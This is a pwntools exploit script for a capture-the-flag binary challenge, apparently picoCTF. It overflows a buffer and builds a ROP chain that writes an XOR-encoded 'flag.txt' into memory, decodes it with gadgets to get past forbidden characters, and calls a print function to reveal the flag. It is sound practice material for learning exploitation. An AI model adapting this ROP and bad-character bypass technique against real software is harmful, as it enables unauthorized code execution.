from pwn import *
import sys

is_debug = False
gdbscript = f'''
    init-pwndbg
    b *0x40069c
    b *0x400628
    r < payload.txt
    '''.format(**locals())


def dealing_with_arguments():
    '''
    Determine local vs remote execution
    '''

    if len(sys.argv) > 1:
        if sys.argv[1].lower() == "remote":
            return remote('saturn.picoctf.net', 54100)

        elif sys.argv[1].lower() == "gdb":
            return gdb.debug([program], gdbscript=gdbscript)
            # io = elf.process()
            # is_debug = True
        elif sys.argv[1].lower() == "local":
            return elf.process()
        else:
            print("usage of this script: script.py remote/gdb/local/test executable_program")
            exit()
    else:
        print("usage of this script: script.py remote/gdb/local executable_program")
        exit()

# Set up pwntools for the correct architecture
program = f'./{sys.argv[2]}'
elf = context.binary = ELF(program,checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


io = dealing_with_arguments()

xor_key = 8
xored_value = xor('flag.txt' ,xor_key)

# if the var has "x,a,g,.,\n" change the xor_key
print(xored_value)

data_section = 0x601030 # added 2 because regular address + distance_from_data_section in 7th run generates '.' which is forbidden
xor_r15_r14 = 0x400628
pop_r12_r13_r14_r15 = 0x40069c
pop_rdi = 0x4006a3
mov_r13_r12 = 0x400634
print_file_function = 0x400510
padding = 40
pop_r14_r15 = 0x4006a0

xor_rop = b""
distance_from_data_section = 0

## Create a rop chain that xor all characters in "flag.txt"
for char in xored_value:
    print(f"character number {distance_from_data_section}, is: {char}, location: {pack(data_section + distance_from_data_section)}")
    xor_rop += pack(pop_r14_r15)
    xor_rop += pack(xor_key)
    xor_rop += pack(data_section + distance_from_data_section)
    xor_rop += pack(xor_r15_r14)
    distance_from_data_section += 1


payload = flat(
    'B' * padding,
    pop_r12_r13_r14_r15,
    xored_value,
    data_section,
    0x00,
    0x00,
    mov_r13_r12,
    xor_rop,
    pop_rdi,
    data_section,
    print_file_function
)

# Write payload to txt file
write('payload.txt', payload)

# Send the payload
io.sendlineafter(b'>', payload)

# Receive the flag
print(io.recvall().decode())

